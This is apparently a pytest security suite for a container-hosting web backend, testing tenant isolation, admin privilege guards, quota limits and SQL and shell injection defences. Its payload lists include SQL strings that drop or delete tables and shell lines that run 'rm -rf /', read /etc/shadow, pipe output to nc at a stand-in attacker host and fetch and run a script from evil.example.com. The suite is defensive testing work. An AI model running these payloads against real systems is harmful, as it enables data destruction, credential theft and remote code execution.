"""
Authorization and injection defenses, tested from an attacker's seat.

The unit suite asks "does this endpoint work for the right user". This file
asks the inverse: given a valid low-privilege session, what can it reach that
it should not? Every test here holds a genuine, signed, unexpired cookie — the
question is never whether authentication works, but whether *authorization*
holds once past it.

Three classes of defense are covered:

  1. Tenant isolation — user A must not see, touch, or infer user B's
     containers, and must not be able to distinguish "forbidden" from
     "nonexistent".
  2. Privilege boundaries — a user must not be able to promote themselves,
     and the last admin must not be removable.
  3. Injection — SQL through every string that reaches a query, and shell
     metacharacters through the terminal endpoint.
"""

import pytest
from falcon import testing

from backend.app import create_app
from backend.db import repo

from .conftest import make_user

pytestmark = pytest.mark.usefixtures("isolated_db", "isolated_tsdb")


@pytest.fixture(scope="module")
def tenants(isolated_db, isolated_tsdb, fake_lxd):
    """Two isolated users plus an admin, each user owning one container.

    Built through the repo rather than the API so the fixture is not itself
    dependent on the endpoints under test.
    """
    client = testing.TestClient(create_app())

    admin_id, admin_headers = make_user("sec-admin@example.com", role="admin")
    alice_id, alice_headers = make_user("sec-alice@example.com",
                                       ram=4096, cpu=4.0, disk=40)
    bob_id, bob_headers = make_user("sec-bob@example.com",
                                    ram=4096, cpu=4.0, disk=40)

    boxes = {}
    for owner, owner_id, name in [
        ("alice", alice_id, "alice-box"),
        ("bob", bob_id, "bob-box"),
    ]:
        fake_lxd.add(name)
        cid = repo.create_container_record(
            lxd_name=name, image="ubuntu:22.04", created_by=admin_id,
            limit_ram_mb=512, limit_cpu=1.0, limit_disk_gb=5,
        )
        repo.assign_container(owner_id, cid)
        boxes[owner] = cid

    return {
        "client": client,
        "admin": admin_headers, "admin_id": admin_id,
        "alice": alice_headers, "alice_id": alice_id,
        "bob": bob_headers, "bob_id": bob_id,
        "alice_box": boxes["alice"], "bob_box": boxes["bob"],
        "lxd": fake_lxd,
    }


class TestTenantIsolation:
    """Alice must not reach anything belonging to Bob."""

    def test_listing_shows_only_own_containers(self, tenants):
        """Each user's listing is scoped to their own assignments."""
        for who, own_box in [("alice", "alice_box"), ("bob", "bob_box")]:
            result = tenants["client"].simulate_get(
                "/api/containers", headers=tenants[who]
            )
            ids = [c["id"] for c in result.json["containers"]]
            assert ids == [tenants[own_box]], (
                f"{who} sees {len(ids)} containers; expected exactly their own"
            )

    def test_admin_sees_both(self, tenants):
        """The admin view is not scoped — this is what makes scoping visible."""
        result = tenants["client"].simulate_get(
            "/api/containers", headers=tenants["admin"]
        )
        ids = {c["id"] for c in result.json["containers"]}
        assert {tenants["alice_box"], tenants["bob_box"]} <= ids

    def test_cross_tenant_read_is_forbidden(self, tenants):
        """Alice reading Bob's container by id gets 403."""
        result = tenants["client"].simulate_get(
            f"/api/containers/{tenants['bob_box']}", headers=tenants["alice"]
        )
        assert result.status_code == 403

    def test_cross_tenant_exec_is_forbidden_and_never_runs(self, tenants):
        """Alice cannot run a command inside Bob's container.

        Asserting on the daemon's own record matters here: a 403 that still
        executed would be a full compromise wearing an error code.
        """
        bob_container = tenants["lxd"].containers._store["bob-box"]
        before = len(bob_container.executed)

        result = tenants["client"].simulate_post(
            f"/api/containers/{tenants['bob_box']}/exec",
            headers=tenants["alice"],
            json={"command": ["cat", "/etc/shadow"]},
        )

        assert result.status_code == 403
        assert len(bob_container.executed) == before, (
            "the command executed in Bob's container despite the 403"
        )

    def test_cross_tenant_metrics_are_forbidden(self, tenants):
        """Metrics are per-container data and follow the same access rule."""
        latest = tenants["client"].simulate_get(
            "/api/metrics/latest",
            params={"container": tenants["bob_box"]},
            headers=tenants["alice"],
        )
        assert latest.status_code == 403

        history = tenants["client"].simulate_get(
            f"/api/containers/{tenants['bob_box']}/history",
            params={"window": "1h"},
            headers=tenants["alice"],
        )
        assert history.status_code == 403

    def test_forbidden_and_nonexistent_are_indistinguishable(self, tenants):
        """Existence must not leak through differing status codes.

        If a real-but-unassigned id returned 403 while a random id returned
        404, an attacker could enumerate every container id on the host by
        watching which code came back.
        """
        import uuid

        real_but_forbidden = tenants["client"].simulate_get(
            f"/api/containers/{tenants['bob_box']}", headers=tenants["alice"]
        )
        pure_fiction = tenants["client"].simulate_get(
            f"/api/containers/{uuid.uuid4()}", headers=tenants["alice"]
        )

        assert real_but_forbidden.status_code == pure_fiction.status_code == 403
        # The body must not leak either — no "not found" phrasing on one side.
        assert (
            real_but_forbidden.json["title"] == pure_fiction.json["title"]
        ), "response bodies differ, which still leaks existence"

    def test_user_cannot_grant_themselves_access(self, tenants):
        """Assignment is admin-only; a user cannot self-assign Bob's box."""
        result = tenants["client"].simulate_post(
            f"/api/users/{tenants['alice_id']}/containers/{tenants['bob_box']}",
            headers=tenants["alice"],
        )
        assert result.status_code == 403
        assert not repo.user_has_access(
            tenants["alice_id"], tenants["bob_box"]
        ), "alice granted herself access"

    def test_user_cannot_revoke_another_users_access(self, tenants):
        """Nor can a user strip a peer's access — that is an admin action."""
        result = tenants["client"].simulate_delete(
            f"/api/users/{tenants['bob_id']}/containers/{tenants['bob_box']}",
            headers=tenants["alice"],
        )
        assert result.status_code == 403
        assert repo.user_has_access(tenants["bob_id"], tenants["bob_box"]), (
            "alice revoked bob's access to his own container"
        )


class TestPrivilegeBoundaries:
    """A user must not be able to become an admin."""

    def test_user_cannot_promote_themselves(self, tenants):
        """PATCH /api/users/{id} is admin-only, even for one's own record."""
        result = tenants["client"].simulate_patch(
            f"/api/users/{tenants['alice_id']}",
            headers=tenants["alice"],
            json={"role": "admin"},
        )
        assert result.status_code == 403
        assert repo.get_user_by_id(tenants["alice_id"])["role"] == "user", (
            "self-promotion succeeded"
        )

    def test_user_cannot_raise_their_own_quota(self, tenants):
        """Quota is the enforcement mechanism, so it must not be self-editable."""
        result = tenants["client"].simulate_patch(
            f"/api/users/{tenants['alice_id']}",
            headers=tenants["alice"],
            json={"quota_ram_mb": 999999},
        )
        assert result.status_code == 403
        assert repo.get_user_by_id(
            tenants["alice_id"]
        )["quota_ram_mb"] == 4096

    def test_only_whitelisted_user_fields_can_be_updated(self, tenants):
        """An admin PATCH must not be able to set arbitrary columns.

        update_user builds its SET clause dynamically, so the field whitelist
        is what stands between a PATCH body and arbitrary column writes.
        """
        result = tenants["client"].simulate_patch(
            f"/api/users/{tenants['alice_id']}",
            headers=tenants["admin"],
            json={"id": "hijacked", "email": "attacker@example.com",
                  "created_at": "1970-01-01"},
        )
        # Either refused outright or silently ignored — never applied.
        assert result.status_code in (200, 400)
        alice = repo.get_user_by_id(tenants["alice_id"])
        assert alice is not None, "the primary key was overwritten"
        assert alice["email"] == "sec-alice@example.com"

    def test_last_admin_cannot_be_demoted(self, tenants):
        """Demoting the final admin would lock everyone out of administration."""
        # Count the admins that actually exist in this isolated DB.
        admins = [
            u for u in repo.list_users()
            if u["role"] == "admin" and u["status"] == "active"
        ]
        if len(admins) > 1:
            pytest.skip("more than one admin present; not the last-admin case")

        result = tenants["client"].simulate_patch(
            f"/api/users/{tenants['admin_id']}",
            headers=tenants["admin"],
            json={"role": "user"},
        )
        assert result.status_code == 400, (
            "the last admin was demoted, locking the system out of admin"
        )
        assert repo.get_user_by_id(tenants["admin_id"])["role"] == "admin"

    @pytest.mark.xfail(
        strict=True,
        reason=(
            "FINDING: the last-admin guard at users.py:169 only fires when "
            "the PATCH sets role='user'. Setting status='revoked' on the "
            "final admin bypasses it entirely and has the same effect — the "
            "OAuth callback refuses revoked users, so once the 15-minute "
            "access token expires nobody can perform an admin action again, "
            "and no endpoint exists to undo it. The guard should cover both "
            "fields."
        ),
    )
    def test_last_admin_cannot_be_revoked(self, tenants):
        """Same protection via the status field rather than the role field.

        Asserts the intended behaviour. It currently fails, and the xfail
        reason records why — see the finding above.
        """
        admins = [
            u for u in repo.list_users()
            if u["role"] == "admin" and u["status"] == "active"
        ]
        if len(admins) > 1:
            pytest.skip("more than one admin present")

        try:
            result = tenants["client"].simulate_patch(
                f"/api/users/{tenants['admin_id']}",
                headers=tenants["admin"],
                json={"status": "revoked"},
            )
            assert result.status_code == 400, (
                "the last admin was revoked via status, bypassing the role "
                "check"
            )
            assert (
                repo.get_user_by_id(tenants["admin_id"])["status"] == "active"
            )
        finally:
            # The PATCH succeeds today, so without this the module's admin
            # would stay revoked and every later test here would fail for an
            # unrelated reason.
            repo.update_user(tenants["admin_id"], status="active")


class TestInjection:
    """Untrusted strings must never reach a SQL query or a shell."""

    # Payloads chosen to break out of a naive f-string query in several ways:
    # comment truncation, statement stacking, boolean tautology, and a
    # destructive DROP that would be unmistakable if it landed.
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin'--",
        "' UNION SELECT id, email, role FROM users --",
        '" OR ""="',
        "1; DELETE FROM containers WHERE 1=1; --",
    ]

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payloads_in_user_invite_are_inert(self, tenants, payload):
        """An invite email carrying SQL must be stored as data, not executed."""
        tenants["client"].simulate_post(
            "/api/users", headers=tenants["admin"],
            json={"email": payload, "role": "user"},
        )
        # Whatever the endpoint decided (201 or 400), the schema must survive.
        assert repo.get_user_by_id(tenants["alice_id"]) is not None, (
            f"users table damaged by payload {payload!r}"
        )
        assert repo.get_container_by_id(tenants["alice_box"]) is not None, (
            f"containers table damaged by payload {payload!r}"
        )

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payloads_in_path_ids_are_inert(self, tenants, payload):
        """Ids from the URL reach WHERE clauses and must be parameterized."""
        result = tenants["client"].simulate_get(
            f"/api/containers/{payload}", headers=tenants["admin"]
        )
        assert result.status_code < 500, (
            f"payload {payload!r} caused {result.status_code}"
        )
        assert repo.get_container_by_id(tenants["alice_box"]) is not None

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payloads_in_metrics_query_are_inert(self, tenants, payload):
        """The container query param is attacker-controlled too."""
        result = tenants["client"].simulate_get(
            "/api/metrics/latest", params={"container": payload},
            headers=tenants["admin"],
        )
        assert result.status_code < 500
        assert repo.list_users(), "users table emptied by a metrics query"

    def test_tables_are_all_intact_after_the_injection_sweep(self, tenants):
        """A single end-of-sweep check that the schema is fully present."""
        conn = repo.get_connection()
        try:
            names = {
                r["name"] for r in conn.execute(
                    "SELECT name FROM sqlite_master WHERE type='table'"
                ).fetchall()
            }
        finally:
            conn.close()
        for table in ["users", "sessions", "containers", "assignments",
                      "audit_log"]:
            assert table in names, f"table {table} was dropped"

    # Shell metacharacters that would be catastrophic if the command were
    # ever joined into a string and handed to a shell.
    SHELL_PAYLOADS = [
        "echo hi; rm -rf /",
        "echo hi && cat /etc/shadow",
        "echo hi | nc attacker.example.com 4444",
        "$(curl http://evil.example.com/x.sh | sh)",
        "`whoami`",
        "echo hi\nrm -rf /",
    ]

    @pytest.mark.parametrize("payload", SHELL_PAYLOADS)
    def test_string_commands_are_refused_outright(self, tenants, payload):
        """A shell string is rejected by type before anything executes.

        The endpoint requires a list of strings — an argv array passed to LXD
        without a shell. That type check is the whole injection defense, so
        it must reject strings regardless of their content.
        """
        container = tenants["lxd"].containers._store["alice-box"]
        before = len(container.executed)

        result = tenants["client"].simulate_post(
            f"/api/containers/{tenants['alice_box']}/exec",
            headers=tenants["alice"], json={"command": payload},
        )

        assert result.status_code == 400, (
            f"string command {payload!r} was accepted with "
            f"{result.status_code}"
        )
        assert len(container.executed) == before, (
            f"payload {payload!r} reached the container"
        )

    @pytest.mark.parametrize("bad", [
        None, 42, {"cmd": "ls"}, [], ["ls", 42], ["ls", None], ["ls", ["nested"]],
    ])
    def test_non_argv_command_shapes_are_refused(self, tenants, bad):
        """Only a non-empty list of strings is acceptable."""
        result = tenants["client"].simulate_post(
            f"/api/containers/{tenants['alice_box']}/exec",
            headers=tenants["alice"], json={"command": bad},
        )
        assert result.status_code == 400, (
            f"command={bad!r} was accepted with {result.status_code}"
        )

    def test_metacharacters_inside_a_single_argv_element_stay_literal(
        self, tenants
    ):
        """Shell characters in one argv element are data, not syntax.

        This is the positive half of the defense: `echo "; rm -rf /"` is a
        perfectly legitimate command. It must run, and it must arrive at LXD
        as one unsplit element.
        """
        argv = ["echo", "; rm -rf / && curl evil.example.com"]
        result = tenants["client"].simulate_post(
            f"/api/containers/{tenants['alice_box']}/exec",
            headers=tenants["alice"], json={"command": argv},
        )
        assert result.status_code == 200
        assert tenants["lxd"].containers._store[
            "alice-box"
        ].executed[-1] == argv, "argv was split or rewritten in transit"


class TestQuotaEnforcementBoundaries:
    """Quota is a security control, so its edges are worth pinning down."""

    def test_exactly_at_quota_is_allowed(self, tenants):
        """The limit is inclusive: filling a quota exactly must not fail."""
        user_id, headers = make_user("sec-exact@example.com",
                                     ram=1024, cpu=1.0, disk=10)
        tenants["lxd"].add("exact-box")
        cid = repo.create_container_record(
            lxd_name="exact-box", image="ubuntu:22.04",
            created_by=tenants["admin_id"],
            limit_ram_mb=1024, limit_cpu=1.0, limit_disk_gb=10,
        )
        result = tenants["client"].simulate_post(
            f"/api/users/{user_id}/containers/{cid}",
            headers=tenants["admin"],
        )
        assert result.status_code == 201, (
            f"an exactly-at-quota grant was refused: {result.json}"
        )

    def test_one_mb_over_quota_is_refused(self, tenants):
        """And one unit past it is refused — an off-by-one here is a bypass."""
        user_id, _ = make_user("sec-over@example.com",
                               ram=1024, cpu=1.0, disk=10)
        tenants["lxd"].add("over-box")
        cid = repo.create_container_record(
            lxd_name="over-box", image="ubuntu:22.04",
            created_by=tenants["admin_id"],
            limit_ram_mb=1025, limit_cpu=1.0, limit_disk_gb=10,
        )
        result = tenants["client"].simulate_post(
            f"/api/users/{user_id}/containers/{cid}",
            headers=tenants["admin"],
        )
        assert result.status_code == 400
        assert "1MB" in result.json["description"]

    def test_zero_quota_means_unlimited(self, tenants):
        """A 0 quota is treated as 'no limit', not 'nothing allowed'.

        Worth pinning explicitly: the check is `> quota and quota > 0`, so a
        future refactor that drops the second clause would silently lock out
        every unlimited account.
        """
        user_id, _ = make_user("sec-unlimited@example.com",
                               ram=0, cpu=0.0, disk=0)
        tenants["lxd"].add("huge-box")
        cid = repo.create_container_record(
            lxd_name="huge-box", image="ubuntu:22.04",
            created_by=tenants["admin_id"],
            limit_ram_mb=999999, limit_cpu=64.0, limit_disk_gb=9999,
        )
        result = tenants["client"].simulate_post(
            f"/api/users/{user_id}/containers/{cid}",
            headers=tenants["admin"],
        )
        assert result.status_code == 201

    @pytest.mark.xfail(
        strict=True,
        reason=(
            "FINDING: raising limits on an assigned container checks the "
            "quota of container['created_by'] (the admin) instead of the "
            "users the container is assigned to. Since admins are typically "
            "unlimited, an admin can push an assigned user arbitrarily far "
            "past their quota through PATCH /api/containers/{id} without "
            "the check ever firing. containers.py:311 should check every "
            "active assignee, the way assignments.py:80 checks the grantee."
        ),
    )
    def test_limit_increase_respects_the_assignees_quota(self, tenants):
        """A limit raise must be checked against whoever holds the container.

        Grant-time enforcement is correct, so the only way to exceed a quota
        is to grant a small container and then grow it. This asserts the
        intended behaviour; it currently fails, and the xfail reason records
        why.
        """
        user_id, _ = make_user("sec-victim@example.com",
                               ram=1024, cpu=1.0, disk=10)
        tenants["lxd"].add("creep-box")
        cid = repo.create_container_record(
            lxd_name="creep-box", image="ubuntu:22.04",
            created_by=tenants["admin_id"],
            limit_ram_mb=512, limit_cpu=0.5, limit_disk_gb=5,
        )
        grant = tenants["client"].simulate_post(
            f"/api/users/{user_id}/containers/{cid}",
            headers=tenants["admin"],
        )
        assert grant.status_code == 201

        # The creating admin's own quota is lifted for the duration of the
        # PATCH (0 means unlimited). Without this the request is refused
        # because the *admin's* 4GB quota is exceeded by the 7.5GB delta —
        # the test would pass while the defect it exists to catch went
        # completely unexercised.
        repo.update_user(tenants["admin_id"], quota_ram_mb=0,
                         quota_cpu=0.0, quota_disk_gb=0)
        try:
            # 8GB against the assignee's 1GB quota — must be refused.
            result = tenants["client"].simulate_patch(
                f"/api/containers/{cid}", headers=tenants["admin"],
                json={"limits": {"ram_mb": 8192, "cpu": 0.5, "disk_gb": 5}},
            )
            assert result.status_code == 400, (
                f"raised an assignee 8x past their RAM quota and got "
                f"{result.status_code}"
            )
        finally:
            repo.update_user(tenants["admin_id"], quota_ram_mb=4096,
                             quota_cpu=4.0, quota_disk_gb=40)
